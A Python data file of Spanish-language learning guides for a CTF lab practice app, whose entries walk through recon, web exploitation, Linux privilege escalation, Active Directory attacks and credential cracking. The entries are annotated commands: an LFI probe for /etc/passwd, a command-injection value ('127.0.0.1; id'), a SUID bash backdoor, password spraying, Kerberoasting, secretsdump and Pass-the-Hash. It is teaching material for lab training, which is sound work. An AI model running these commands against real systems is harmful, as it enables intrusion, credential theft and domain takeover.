# Step-by-step learning guides for the "Aprender" mode of the web app.
# Prose-first: each step explains the idea (why), what to look for, and how to
# decide the next move. Commands carry per-command annotations: "why" (por que /
# cuando usar ese comando) and "out" (que detalles buscar en su salida). A command
# may also be a plain string (the renderer accepts both).
# "section" links a guide to its practice section (slug) for the "ver comandos" jump.
# Exported into web/data/content.json under "guides" by export_web_content.py.

GUIDES = [
    {
        "id": "metodologia",
        "title": "Cómo enfrentar una room",
        "phase": "recon",
        "section": "mapa-de-decisiones",
        "summary": "El mapa mental para no ir a ciegas: de la IP a root como una cadena de fases.",
        "steps": [
            {
                "title": "Entiende que es una cadena, no un truco",
                "idea": "Una room casi nunca se resuelve con un solo comando mágico. Es una cadena: reconocimiento, enumeración, acceso inicial y escalada de privilegios. Cada fase te da información que desbloquea la siguiente. La mayoría de atascos vienen de saltarte una fase o de no anotar lo que ya encontraste.",
                "commands": [
                    {
                        "cmd": "mkdir -p nmap web loot creds notes",
                        "why": "Ordenar el trabajo desde el minuto cero evita perder hallazgos. Una room se pierde tanto por no encontrar el vector como por olvidar una credencial que ya tenías anotada.",
                        "out": "No da salida: comprueba con ls que están las carpetas. A partir de aquí guarda cada output en su carpeta (escaneos en nmap/, loot en loot/).",
                    },
                ],
                "look": "Una carpeta de trabajo por room y la IP fijada arriba en la app, para que los comandos se autocompleten con tu objetivo.",
                "decide": "Si no sabes por dónde empezar, la respuesta siempre es recon. Nunca arranques lanzando exploits al azar.",
            },
            {
                "title": "Reconoce: qué hay expuesto",
                "idea": "El objetivo es saber qué servicios corren y en qué versión. No puedes atacar lo que no sabes que existe. Primero descubres puertos abiertos (rápido y amplio) y después miras versiones y scripts solo en los que estén abiertos, para no hacer ruido innecesario.",
                "commands": [
                    {
                        "cmd": "nmap -p- -Pn -n --min-rate 5000 $IP -oN nmap/all_ports.txt",
                        "why": "Barres los 65535 puertos sin scripts porque es rápido y no asumes que los servicios estén en su puerto típico (los labs los mueven). -Pn evita que nmap descarte el host por no responder al ping.",
                        "out": "Solo la lista de puertos en estado open. Ignora las versiones aquí; anota los números de puerto para el segundo escaneo.",
                    },
                    {
                        "cmd": "nmap -sC -sV -Pn -p <PUERTOS> $IP -oN nmap/services.txt",
                        "why": "Ahora sí pides versión (-sV) y scripts por defecto (-sC), pero SOLO en los puertos abiertos, para no tardar una eternidad ni hacer ruido inútil.",
                        "out": "Versión exacta de cada servicio (tu primera pista para CVEs), hostnames en certificados TLS y títulos de web. Apunta los hostnames a /etc/hosts.",
                    },
                ],
                "look": "Puertos abiertos y, sobre todo, versiones. Un servicio con versión concreta es tu primera pista para buscar CVEs o formas de enumerar.",
                "decide": "Web (80/443) -> enumeración web. SMB (445) -> enum de shares/usuarios. 88/389 -> es un dominio, piensa en Active Directory.",
            },
            {
                "title": "Enumera: convierte servicios en pistas",
                "idea": "Enumerar es exprimir cada servicio hasta encontrar la puerta. Aquí se gana o se pierde la room. La clave es interpretar: cada respuesta te dice algo. Un share legible, un endpoint de API, un usuario válido... son piezas que encajarás luego.",
                "commands": [
                    {
                        "cmd": "whatweb $URL",
                        "why": "Identifica de un vistazo la tecnología web (CMS, framework, lenguaje, versiones). Saber si es WordPress o una API en Node cambia por completo que bug buscar.",
                        "out": "El CMS o framework y su versión, cabeceras que delaten el backend, y redirecciones. WordPress/Joomla -> pasa a su enumeración específica.",
                    },
                    {
                        "cmd": "nxc smb $IP -u '' -p '' --shares",
                        "why": "Prueba acceso anónimo a SMB (sesión nula). Muchos labs dejan un share legible sin credenciales con configs o backups dentro; es el camino fácil, compruébalo antes de complicarte.",
                        "out": "Columna de permisos READ/WRITE por share. Un READ en algo que no sea IPC$ es saqueo inmediato. También el nombre del equipo y el dominio.",
                    },
                ],
                "look": "Nombres de usuario, rutas ocultas, ficheros de configuración, versiones de software, mensajes de error que revelen tecnología.",
                "decide": "Si encuentras credenciales -> pruébalas en todos los servicios. Si encuentras una versión vulnerable -> valida el CVE antes de explotar.",
            },
            {
                "title": "Accede, estabiliza y escala",
                "idea": "Con una entrada (shell o login), lo primero es estabilizar y orientarte: quién eres y qué permisos tienes. La escalada sigue la misma lógica de siempre: buscar algo que un usuario más privilegiado ejecuta, lee o confía, y que tú puedes tocar.",
                "commands": [
                    {
                        "cmd": "whoami; id; hostname",
                        "why": "Lo primero al pisar una máquina: saber quién eres, en qué grupos estás y en qué host. Sin esto disparas a ciegas.",
                        "out": "Tu usuario y uid. Grupos jugosos (sudo, docker, lxd, adm, disk). El hostname a veces revela el rol de la máquina (DC, web, db).",
                    },
                    {
                        "cmd": "sudo -l",
                        "why": "El primer vector de privesc a mirar siempre: qué puedes ejecutar como otro usuario/root, idealmente sin password (NOPASSWD).",
                        "out": "Líneas '(root) NOPASSWD: /ruta/binario'. Cada binario que salga -> búscalo en GTFOBins para la receta de abuso.",
                    },
                ],
                "look": "Tu usuario, tus grupos, permisos sudo, tareas programadas, binarios con permisos raros, credenciales reutilizables.",
                "decide": "Cada credencial nueva -> reenumera todo desde el principio con ella. Root/SYSTEM -> recoge flags y anota el root cause (por qué funcionó).",
            },
        ],
    },
    {
        "id": "recon-paso-a-paso",
        "title": "Reconocimiento: de puertos a superficie",
        "phase": "recon",
        "section": "recon-y-servicios",
        "summary": "Por qué se escanea así y qué hacer con cada tipo de servicio que aparece.",
        "steps": [
            {
                "title": "Primero todos los puertos, rápido",
                "idea": "Escaneas los 65535 puertos sin scripts primero porque es rápido y no quieres asumir que un servicio está en su puerto típico (muchos labs los mueven). -Pn evita que nmap descarte el host si no responde al ping, algo común en máquinas filtradas.",
                "commands": [
                    {
                        "cmd": "nmap -p- -Pn -n --min-rate 5000 $IP -oN nmap/all_ports.txt",
                        "why": "-p- fuerza los 65535 puertos; sin -sV/-sC va rápido. --min-rate 5000 acelera; -n evita esperas de DNS. Es un barrido de amplitud, no de profundidad.",
                        "out": "Solo los puertos open. Si sale 1 o 2 puertos raros y altos, sospecha de servicios movidos a propósito. Copia los números para el siguiente escaneo.",
                    },
                ],
                "look": "La lista de puertos abiertos. Ignora de momento las versiones; solo quieres saber dónde mirar.",
                "decide": "Con la lista de puertos, lanza el segundo escaneo SOLO sobre esos puertos. Escanear versiones de los 65535 es lento e inútil.",
            },
            {
                "title": "Ahora versiones y scripts, solo donde hace falta",
                "idea": "-sV detecta la versión exacta del servicio y -sC lanza los scripts por defecto de nmap, que a menudo ya revelan cosas (títulos web, shares anónimos, certificados con hostnames). La versión es oro: te dice qué buscar en searchsploit.",
                "commands": [
                    {
                        "cmd": "nmap -sC -sV -Pn -p <PUERTOS> $IP -oN nmap/services.txt",
                        "why": "Profundizas solo en los puertos que ya sabes abiertos. -sV te da la versión (base de la búsqueda de CVEs) y -sC saca información gratis con los scripts NSE por defecto.",
                        "out": "Versiones concretas, banners, hostnames en certificados (añádelos a /etc/hosts), y hallazgos de scripts como smb anónimo o títulos web reveladores.",
                    },
                ],
                "look": "Versiones concretas, hostnames en certificados, banners, y cualquier cosa que los scripts saquen gratis.",
                "decide": "Anota los hostnames que veas y añádelos a /etc/hosts; muchos vhosts solo responden por nombre, no por IP.",
            },
            {
                "title": "Enumera cada servicio por su naturaleza",
                "idea": "Cada servicio se enumera distinto. No memorices comandos sueltos: asocia puerto a objetivo. Web = rutas y parámetros. SMB = shares y usuarios. DNS = transferencia de zona. La app tiene el bloque de comandos por servicio en Recon; úsalo como chuleta.",
                "commands": [
                    {
                        "cmd": "whatweb $URL",
                        "why": "Puerto 80/443: lo primero es saber qué software sirve la web para orientar el ataque (CMS conocido, framework, lenguaje).",
                        "out": "Tecnología y versiones, cabeceras del servidor. Un CMS identificado te lleva a su herramienta dedicada (wpscan, etc.).",
                    },
                    {
                        "cmd": "nxc smb $IP -u '' -p '' --shares",
                        "why": "Puerto 445: comprueba sesión nula/anónima. Es la comprobación más rentable en SMB porque un share legible te ahorra toda la fase de explotación.",
                        "out": "Shares con READ/WRITE. Fíjate en nombres no estándar (backups, transfer, dev). El output también confirma nombre de equipo y dominio.",
                    },
                    {
                        "cmd": "snmpwalk -v2c -c public $IP",
                        "why": "Puerto 161/UDP: la community string 'public' por defecto expone muchísima información del sistema (procesos, usuarios, software, puertos).",
                        "out": "Nombres de usuario del sistema, procesos en ejecución (con argumentos que a veces llevan credenciales), y software instalado con versiones.",
                    },
                ],
                "look": "Cualquier acceso sin credenciales (anónimo/guest), ficheros expuestos, o listados que revelen nombres de usuario reales.",
                "decide": "Si un servicio permite acceso anónimo, entra y saquea antes de buscar exploits. Lo fácil primero.",
            },
        ],
    },
    {
        "id": "web-a-shell",
        "title": "De la web a una shell",
        "phase": "access",
        "section": "web-discovery",
        "summary": "Cómo pasar de una página web a ejecutar comandos, razonando cada paso.",
        "steps": [
            {
                "title": "Fingerprint y descubrimiento",
                "idea": "Antes de buscar bugs, entiende qué es la web: qué tecnología usa y qué rutas existen. El fuzzing de directorios/ficheros revela paneles, backups, APIs o código fuente que no están enlazados. Mide siempre una ruta que no exista para saber qué responde el servidor y filtrar el ruido.",
                "commands": [
                    {
                        "cmd": "whatweb $URL",
                        "why": "La tecnología condiciona los bugs probables: un PHP viejo huele a LFI/RCE, un template engine a SSTI. Empiezas por saber contra qué juegas.",
                        "out": "Lenguaje/framework, versiones, cabeceras. Guárdalo: te dirá qué extensiones fuzzear (.php, .aspx) y qué familia de bug priorizar.",
                    },
                    {
                        "cmd": "ffuf -u \"$URL/FUZZ\" -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.bak -fc 404",
                        "why": "Descubre rutas y ficheros no enlazados (paneles, backups, código). -e prueba extensiones; -fc 404 filtra el ruido de lo que no existe.",
                        "out": "Rutas con código 200/301/403. Ojo al tamaño (Size): respuestas del mismo tamaño suelen ser falsos positivos; una distinta es interesante. Busca /admin, .bak, .git.",
                    },
                ],
                "look": "Rutas interesantes: /admin, /api, /backup, .git, ficheros .bak o de config. Y la tecnología (PHP, Node, Python) que condiciona los bugs probables.",
                "decide": "Ves /api o /v1 -> fuzzea endpoints y métodos HTTP. Ves .git -> vuelca el repo. Ves un login -> prueba defaults y SQLi.",
            },
            {
                "title": "Encuentra la entrada (parámetros y métodos)",
                "idea": "Los bugs viven en la entrada de datos: parámetros GET/POST, cabeceras, campos JSON de una API. Un mismo endpoint puede ser inofensivo con GET y inyectable con PUT o POST. Por eso se fuzzea también el método HTTP, no solo la ruta.",
                "commands": [
                    {
                        "cmd": "for m in GET POST PUT DELETE PATCH; do echo -n \"$m \"; curl -s -o /dev/null -w \"%{http_code}\\n\" -X $m \"$URL/api/resource\"; done",
                        "why": "El mismo endpoint puede comportarse distinto según el método. Un PUT/DELETE habilitado donde esperabas solo GET suele ser una vía de escritura o borrado no prevista.",
                        "out": "El código HTTP por método. Un 200/201 en PUT/POST/DELETE donde GET daba 405/403 es la señal: ese método hace algo que el dev no protegio.",
                    },
                    {
                        "cmd": "arjun -u \"$URL/page.php\"",
                        "why": "Descubre parámetros ocultos que no aparecen en el HTML. Un parámetro no documentado (debug, file, cmd) es a menudo el que no está saneado.",
                        "out": "Lista de parámetros válidos que la página acepta. Nombres tipo file/page/include -> prueba LFI; id/user -> SQLi/IDOR; cmd/exec -> command injection.",
                    },
                ],
                "look": "Parámetros que cambian la respuesta, métodos que devuelven códigos distintos, mensajes de error de base de datos o de plantilla.",
                "decide": "Error SQL -> SQLi. {{7*7}} da 49 -> SSTI. Un parámetro file/page -> prueba LFI. La respuesta refleja tu input -> XSS o SSTI.",
            },
            {
                "title": "Confirma la vulnerabilidad antes de explotar",
                "idea": "Confirmar evita perder horas con falsos positivos. Manda una prueba mínima e inocua: para command injection, un id; para SQLi, una comilla o un OR 1=1; para LFI, /etc/passwd. Confirmar también te dice el contexto (usuario, SO) que necesitas para el siguiente paso.",
                "commands": [
                    {
                        "cmd": "curl -sS \"$URL/page.php?file=../../../../etc/passwd\"",
                        "why": "Prueba de LFI con un fichero que siempre existe en Linux. Los ../ suben hasta la raíz sin importar la profundidad, así que sirve aunque no sepas la ruta exacta.",
                        "out": "Líneas root:x:0:0 confirman lectura de ficheros. Si en vez de eso ves un error de include con una ruta, apunta esa ruta: te dice dónde estás en el disco.",
                    },
                    {
                        "cmd": "curl -sS -X POST \"$URL/api/ping\" -H 'Content-Type: application/json' -d '{\"host\":\"127.0.0.1; id\"}'",
                        "why": "Prueba de command injection: si la app pasa 'host' a un ping del sistema, el ; encadena tu comando. Usas id (inocuo) para confirmar sin romper nada.",
                        "out": "La salida de id (uid=... gid=...) mezclada con la respuesta normal confirma ejecución. Fíjate en el usuario: te dice con qué privilegios ejecutas.",
                    },
                ],
                "look": "El contenido de /etc/passwd, la salida de id, un retraso si usaste sleep. Eso confirma que controlas algo del servidor.",
                "decide": "Confirmado -> escala a lectura de código/config o a ejecución. No confirmado -> vuelve al paso anterior, prueba otro parámetro o método.",
            },
            {
                "title": "Convierte en shell y estabiliza",
                "idea": "Con ejecución de comandos, lanzas una reverse shell hacia tu máquina. La shell inicial es 'tonta' (sin Ctrl+C, sin autocompletado); estabilizarla a una TTY completa te ahorra errores y te deja trabajar cómodo. Usa el generador de reverse shell de la app con tu IP de atacante.",
                "commands": [
                    {
                        "cmd": "nc -lvnp 4444",
                        "why": "Pone tu máquina a la escucha ANTES de disparar el payload. Si no tienes el listener abierto, la reverse shell conecta contra la nada y la pierdes.",
                        "out": "Espera 'listening on ...' y luego 'connect received' cuando entre la shell. Si no conecta, revisa que tu IP de atacante y el puerto coincidan con el payload.",
                    },
                    {
                        "cmd": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
                        "why": "Primer paso para estabilizar una shell tonta: te da una pseudo-TTY, con lo que ya funcionan cosas como su o passwd que antes fallaban.",
                        "out": "El prompt cambia a uno normal (usuario@host). Después completa con export TERM=xterm y, en tu Kali, stty raw -echo; fg para tener Ctrl+C y autocompletado.",
                    },
                ],
                "look": "La conexión entrante en tu listener y un prompt usable tras estabilizar (export TERM=xterm y stty raw -echo; fg).",
                "decide": "Shell estable -> empieza la enumeración de privesc (whoami/id, sudo -l). Guarda cómo conseguiste la shell para el writeup.",
            },
        ],
    },
    {
        "id": "privesc-linux",
        "title": "Escalar a root en Linux",
        "phase": "privesc",
        "section": "linux-privesc",
        "summary": "La mentalidad de la escalada y cómo pasar de enumerar a explotar.",
        "steps": [
            {
                "title": "La regla de oro",
                "idea": "Toda la escalada se resume en una idea: si puedes modificar, leer o influir en algo que un usuario más privilegiado ejecuta o confía, tienes un vector. Un script que corre root y tú puedes editar, un binario SUID, una tarea cron con ruta escribible... todo es la misma lógica.",
                "commands": [
                    {
                        "cmd": "whoami; id; groups; hostname; pwd",
                        "why": "Fija tu punto de partida. Los grupos, sobre todo, abren atajos: pertenecer a docker o lxd suele ser root casi directo sin buscar más.",
                        "out": "Tu uid/gid y grupos. docker/lxd -> escape de contenedor a root. adm -> puedes leer logs. disk -> lectura cruda del disco. Sin grupos jugosos, sigue enumerando.",
                    },
                ],
                "look": "Tu usuario, tus grupos (docker/lxd/adm son interesantes) y dónde estás. Es tu punto de partida.",
                "decide": "Grupo docker o lxd -> escape casi directo. Usuario normal -> sigue con la enumeración sistemática.",
            },
            {
                "title": "Enumera de forma sistemática",
                "idea": "No adivines: recorre siempre los mismos vectores en orden. Empieza por lo que da resultados rápidos (sudo -l, SUID) y baja a lo más laborioso (cron, configs). Un script como linpeas automatiza esto, pero entender qué busca cada comando te hace mejor.",
                "commands": [
                    {
                        "cmd": "sudo -l",
                        "why": "El vector más rentable y rápido: te dice literalmente qué puedes ejecutar con privilegios. Muchas rooms se resuelven aquí mismo.",
                        "out": "Entradas (root) NOPASSWD: /bin/... . El binario permitido -> GTFOBins. Ojo también a env_keep y a rutas de scripts propios del reto.",
                    },
                    {
                        "cmd": "find / -perm -4000 -type f 2>/dev/null",
                        "why": "Lista binarios SUID (se ejecutan como su dueño, normalmente root). Un SUID que no sea del sistema base es un candidato claro de abuso.",
                        "out": "Rutas de binarios SUID. Ignora los típicos (passwd, sudo, mount); fíjate en cosas raras o versiones concretas (find, nmap, cp, python) -> GTFOBins.",
                    },
                    {
                        "cmd": "getcap -r / 2>/dev/null",
                        "why": "Las capabilities son permisos finos que dan poder sin ser SUID completo. cap_setuid en un binario permite cambiar a uid 0 igual que un SUID.",
                        "out": "Líneas binario = cap_xxx+ep. cap_setuid+ep sobre python/perl/etc es escalada directa. cap_dac_read_search permite leer cualquier fichero (como /etc/shadow).",
                    },
                ],
                "look": "Permisos sudo (sobre todo NOPASSWD), binarios SUID que no sean del sistema, capabilities como cap_setuid.",
                "decide": "Cualquier binario que salga -> búscalo en GTFOBins. Si está ahí, tienes la receta exacta para abusar de él.",
            },
            {
                "title": "Explota el vector, no solo lo enumeres",
                "idea": "Encontrar el vector es la mitad; hay que ejecutarlo. GTFOBins te da la línea concreta para cada binario. La idea común es forzar que ese proceso privilegiado te dé una shell o te copie/edite algo como root (por ejemplo, poner el bit SUID a bash).",
                "commands": [
                    {
                        "cmd": "sudo find . -exec /bin/sh \\; -quit",
                        "why": "Ejemplo de GTFOBins: si puedes ejecutar find con sudo, su flag -exec lanza una shell que hereda los privilegios de root. El binario 'legítimo' te da la shell.",
                        "out": "El prompt cambia a # y id devuelve uid=0(root). Si sigue en $, el binario no corría como root o la sintaxis de abuso no era esa: revisa GTFOBins.",
                    },
                    {
                        "cmd": "cp $(which bash) /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p",
                        "why": "Patrón clásico cuando puedes escribir/copiar como root: creas una copia de bash con bit SUID; -p conserva los privilegios al lanzarla, dándote una shell root persistente.",
                        "out": "Con /tmp/rootbash -p, id muestra euid=0. Es una puerta trasera cómoda para reentrar; recuerda mencionarla y limpiarla en un entorno real.",
                    },
                ],
                "look": "Un prompt de root (# en vez de $) o un id que devuelve uid=0. Eso es el objetivo.",
                "decide": "Root -> recoge la flag de root y documenta el vector exacto. No funciona -> vuelve a la lista y prueba el siguiente vector, no te obsesiones con uno.",
            },
            {
                "title": "Loot y credenciales",
                "idea": "Aunque no seas root todavía, buscar credenciales en disco suele desbloquear la room: configs con contraseñas, historiales, claves SSH, backups. Muchas rooms se escalan reutilizando una password encontrada, no con un exploit.",
                "commands": [
                    {
                        "cmd": "find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys|^/dev'",
                        "why": "Localiza directorios donde puedes escribir. Son clave para abusar de cron/scripts (metes tu payload) y para dejar herramientas. El grep quita ruido de pseudo-fs.",
                        "out": "Rutas escribibles inesperadas. Un directorio escribible que además aparece en una tarea cron o en el PATH de un script root es un vector de escalada directo.",
                    },
                    {
                        "cmd": "grep -riE 'password|passwd|secret' /var/www /home /opt 2>/dev/null | head",
                        "why": "Los devs dejan credenciales en texto claro en configs de la web y en el home. Es de lo primero que hay que peinar; a menudo es más rápido que cualquier exploit.",
                        "out": "Líneas con password=... en configs (wp-config.php, .env, settings). Cada credencial -> pruébala con su usuario vía su/ssh y reenumera sudo -l como él.",
                    },
                ],
                "look": "Contraseñas en texto claro, claves privadas, ficheros .env, historiales de bash con comandos que incluyan credenciales.",
                "decide": "Credencial encontrada -> pruébala con su usuario (su/ssh) y reenumera sudo -l como ese usuario. El camino a root suele ser en cadena.",
            },
        ],
    },
    {
        "id": "active-directory",
        "title": "Active Directory desde cero",
        "phase": "access",
        "section": "active-directory",
        "summary": "El enfoque cambia: no explotas una máquina, transformas identidad en permisos.",
        "steps": [
            {
                "title": "Prepara el terreno: nombres y hora",
                "idea": "AD funciona sobre nombres, no IPs. Kerberos falla si el hostname/dominio no resuelven o si tu reloj está desincronizado con el DC. Antes de nada, identifica el dominio y el DC y añádelos a /etc/hosts. Sin esto, herramientas como impacket fallan con errores confusos.",
                "commands": [
                    {
                        "cmd": "nmap -sC -sV -Pn -p 53,88,135,139,389,445,464,636,3268,5985 $IP",
                        "why": "Escaneas los puertos típicos de un DC de golpe. La combinación 88 (Kerberos) + 389 (LDAP) + 445 confirma que estás ante un dominio, no una máquina suelta.",
                        "out": "El puerto 88 abierto = es un DC. Los scripts LDAP/SMB filtran el nombre del dominio y del DC: anotalos ya para el /etc/hosts.",
                    },
                    {
                        "cmd": "echo \"$IP $DOMAIN $DC_FQDN $DC_HOST\" | sudo tee -a /etc/hosts",
                        "why": "Kerberos y muchas herramientas resuelven por nombre. Sin esta línea en /etc/hosts fallarán con errores de DNS/realm que parecen otra cosa.",
                        "out": "tee reimprime la línea anadida. Verifica luego con ping o nslookup del hostname; a partir de aquí usa nombres, no la IP, en las herramientas de AD.",
                    },
                ],
                "look": "El nombre del dominio y del DC (los scripts de nmap y el rid-brute los revelan), y el puerto 88 (Kerberos) confirmando que es un DC.",
                "decide": "Error de clock skew -> sincroniza tu hora con el DC (ntpdate/faketime). Ya con nombres -> empieza a enumerar usuarios.",
            },
            {
                "title": "Consigue el primer punto de apoyo",
                "idea": "En AD todo empieza con un usuario válido, aunque sea sin password. Puedes sacar la lista de usuarios sin credenciales (RID brute, enum anónimo) y luego probar spraying controlado: una password candidata contra muchos usuarios. Cuidado: el spraying agresivo bloquea cuentas.",
                "commands": [
                    {
                        "cmd": "nxc smb $IP -u 'guest' -p '' --rid-brute | tee rid.txt",
                        "why": "Saca la lista de usuarios del dominio sin credenciales, iterando los RID vía la cuenta guest/nula. Necesitas nombres válidos antes de poder rociar passwords.",
                        "out": "Líneas con SidTypeUser: esos son usuarios reales. Extrae solo los nombres a users.txt (quita máquinas terminadas en $).",
                    },
                    {
                        "cmd": "nxc smb $IP -u users.txt -p 'Password1!' --continue-on-success",
                        "why": "Password spraying: una sola password contra muchos usuarios. Una password por muchos usuarios evita bloqueos (lo contrario, muchas passwords por usuario, si bloquea).",
                        "out": "Un [+] DOMAIN\\usuario:password es credencial válida. --continue-on-success sigue tras el primer acierto por si hay varios. Cuidado con la política de bloqueo.",
                    },
                ],
                "look": "Usuarios válidos (nombre confirmado), o el patrón usuario=password que muchos labs usan. Un [+] en netexec es una credencial buena.",
                "decide": "Credencial válida -> reenumera shares/LDAP/WinRM con ella. Sin credencial pero con usuarios -> prueba AS-REP roasting.",
            },
            {
                "title": "Kerberos: tickets crackeables",
                "idea": "Kerberos regala hashes crackeables offline. AS-REP roasting saca hashes de usuarios sin preauth (no necesitas password). Kerberoasting saca hashes de cuentas de servicio (SPN) si ya tienes una credencial. Los crackeas con hashcat y a menudo son la vía a un usuario más fuerte.",
                "commands": [
                    {
                        "cmd": "impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $IP",
                        "why": "AS-REP roasting: pide tickets para usuarios con preauth de Kerberos desactivada. Con -no-pass no necesitas credenciales, solo la lista de usuarios.",
                        "out": "Hashes que empiezan por $krb5asrep$. Cada uno es crackeable offline. Si no sale ninguno, ningún usuario tiene preauth desactivada: pasa a otra vía.",
                    },
                    {
                        "cmd": "impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $IP -request",
                        "why": "Kerberoasting: con una credencial cualquiera pides tickets de cuentas de servicio (SPN). Esas cuentas suelen tener passwords débiles y muchos privilegios.",
                        "out": "Hashes $krb5tgs$ junto al nombre del servicio. Prioriza cuentas que parezcan admin (sql_admin, svc_backup): si crackean, sueles subir mucho de golpe.",
                    },
                    {
                        "cmd": "hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt",
                        "why": "Crackea los hashes de Kerberoast (-m 13100; para AS-REP es -m 18200). Se hace offline, sin tocar el DC ni arriesgar bloqueos.",
                        "out": "La password en claro tras el hash cuando cae. Esa credencial -> vuelve a enumerar el dominio como ese usuario; suele desbloquear nuevos accesos.",
                    },
                ],
                "look": "Hashes que empiezan por $krb5asrep$ (AS-REP) o $krb5tgs$ (Kerberoast). Si crackean, tienes credenciales nuevas.",
                "decide": "Hash crackeado -> nueva credencial, vuelve a enumerar. Nada crackea -> pasa a BloodHound para buscar rutas por permisos.",
            },
            {
                "title": "BloodHound y camino a Domain Admin",
                "idea": "Con una credencial, BloodHound mapea el dominio y te muestra la ruta más corta a Domain Admin abusando de permisos (GenericAll, WriteDACL, sesiones). Cuando encuentras la cuenta objetivo, extraes sus hashes (secretsdump/DCSync) y te autenticas con Pass-the-Hash sin saber la password.",
                "commands": [
                    {
                        "cmd": "bloodhound-python -d $DOMAIN -u $USER -p $PASS -c all -ns $IP --zip",
                        "why": "Recolecta todo el grafo del dominio (usuarios, grupos, ACLs, sesiones) con una sola credencial. Ver las relaciones te evita adivinar el camino a mano.",
                        "out": "Un .zip que importas en la GUI de BloodHound. Allí marca tu usuario como owned y usa 'Shortest paths to Domain Admins' para leer la ruta.",
                    },
                    {
                        "cmd": "impacket-secretsdump $DOMAIN/$USER:$PASS@$IP",
                        "why": "Si tu usuario tiene privilegios de replicación (DCSync) o admin local, vuelca los hashes NTLM del dominio, incluido administrator y krbtgt.",
                        "out": "Líneas usuario:rid:lmhash:nthash. El NT hash de administrator sirve para Pass-the-Hash. El de krbtgt permite Golden Ticket (persistencia total).",
                    },
                    {
                        "cmd": "evil-winrm -i $IP -u administrator -H <NTLM>",
                        "why": "Pass-the-Hash: te autenticas por WinRM con el hash NTLM en vez de la password. No necesitas crackear nada si ya tienes el hash.",
                        "out": "Un prompt PS de administrator. whoami confirma. Desde ahí recoge la flag de root/admin y documenta la cadena completa que te trajo hasta aquí.",
                    },
                ],
                "look": "En BloodHound: aristas de ACL peligrosas hacia grupos privilegiados. En secretsdump: el hash NTLM de administrator/krbtgt.",
                "decide": "Ruta clara en BloodHound -> abusa del permiso concreto. Hash de admin -> Pass-the-Hash con evil-winrm/psexec y recoge la flag.",
            },
        ],
    },
    {
        "id": "credenciales",
        "title": "Tengo credenciales, y ahora qué",
        "phase": "access",
        "section": "loot-y-secretos",
        "summary": "Buscar, identificar, crackear y reutilizar sin caos.",
        "steps": [
            {
                "title": "Sabe dónde mirar",
                "idea": "Las credenciales no aparecen solas: viven en sitios predecibles. Ficheros de configuración de la web, historiales de shell, claves SSH en homes, backups, y en Windows en configs de IIS o el gestor de credenciales. Buscar sistemáticamente ahorra más rooms que cualquier exploit.",
                "commands": [
                    {
                        "cmd": "grep -riE 'password|passwd|secret|api_key' /var/www /home /opt 2>/dev/null | head",
                        "why": "Peina en un barrido los sitios donde más caen credenciales en claro: raíz web, homes y /opt. Es barato y rentable, hazlo antes de complicarte.",
                        "out": "Líneas con la credencial y el fichero donde vive. Fíjate en el nombre del fichero (config, .env, backup): te da el contexto de para qué servicio es esa clave.",
                    },
                    {
                        "cmd": "find / \\( -name '*.kdbx' -o -name 'id_rsa' -o -name '.env' \\) 2>/dev/null",
                        "why": "Busca ficheros que SON credenciales aunque estén protegidos: vaults KeePass, claves SSH privadas y ficheros de entorno. Un id_rsa legible suele ser acceso directo.",
                        "out": "Rutas de esos ficheros. id_rsa legible -> ssh -i directo (dale chmod 600). .kdbx / zip protegido -> conviértelo a hash y crackea (siguiente paso).",
                    },
                ],
                "look": "Contraseñas en texto claro, claves privadas, ficheros .env, vaults de KeePass, tokens de API.",
                "decide": "Password en claro -> pruébala ya en todos los servicios. Fichero protegido (zip/kdbx/ssh) -> conviértelo a hash y crackea.",
            },
            {
                "title": "Identifica el hash antes de crackear",
                "idea": "Crackear con el modo equivocado no funciona nunca. Primero identifica el tipo de hash: la longitud y el formato dan pistas, y herramientas como hashid o name-that-hash te dan el modo de hashcat. Los ficheros con contraseña se convierten a hash con los *2john.",
                "commands": [
                    {
                        "cmd": "hashid 'HASH'",
                        "why": "Antes de crackear tienes que saber QUÉ es el hash: usar el modo equivocado de hashcat no rompe nada, solo pierdes horas. hashid propone el tipo.",
                        "out": "Lista de posibles tipos (MD5, NTLM, bcrypt, sha512crypt...). Crúzalo con el contexto (un hash de Windows es NTLM) para elegir el -m correcto de hashcat.",
                    },
                    {
                        "cmd": "ssh2john id_rsa > id_rsa.hash",
                        "why": "Una clave SSH protegida con passphrase no se crackea directa: hay que convertirla a un formato que john/hashcat entiendan. Eso hace ssh2john.",
                        "out": "Un fichero .hash con la representación crackeable. Si ssh2john dice que la clave no tiene passphrase, no hay nada que crackear: úsala directamente con ssh -i.",
                    },
                    {
                        "cmd": "keepass2john vault.kdbx > keepass.hash",
                        "why": "Mismo principio para un vault KeePass: lo conviertes a hash para atacar la master password offline. Dentro suele haber muchas credenciales de golpe.",
                        "out": "El hash del vault en keepass.hash. Crackea la master con rockyou; si cae, abre el .kdbx y saquea todas las entradas guardadas.",
                    },
                ],
                "look": "El tipo de hash (NTLM, bcrypt, MD5, krb5...) y su número de modo en hashcat (-m) o el formato en john.",
                "decide": "Ya con el modo correcto -> a crackear. Si es un hash de red (NetNTLM) capturado, ese sí merece Responder/relay, no solo crack.",
            },
            {
                "title": "Crackea con criterio",
                "idea": "Empieza siempre por rockyou: la mayoría de rooms usan passwords de ese diccionario. Si no cae, aplica reglas (best64) antes de saltar a fuerza bruta. hashcat usa GPU (rápido), john es cómodo para formatos raros. No pierdas horas en fuerza bruta pura en un CTF.",
                "commands": [
                    {
                        "cmd": "hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt",
                        "why": "hashcat usa GPU y es lo más rápido para diccionario. -m 1000 es NTLM; cambia el número según lo que dijo hashid. rockyou cubre la mayoría de retos.",
                        "out": "Con --show o al terminar, la línea hash:password. Si no cae en minutos, no insistas con fuerza bruta: quizá el vector real no era crackear ese hash.",
                    },
                    {
                        "cmd": "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
                        "why": "john detecta muchos formatos automáticamente y es cómodo para hashes raros o los generados por *2john (ssh, keepass, zip).",
                        "out": "john indica cuándo crackea. Si no, prueba --rules para mutar rockyou (mayúsculas, números al final) antes de rendirte.",
                    },
                    {
                        "cmd": "john --show hash.txt",
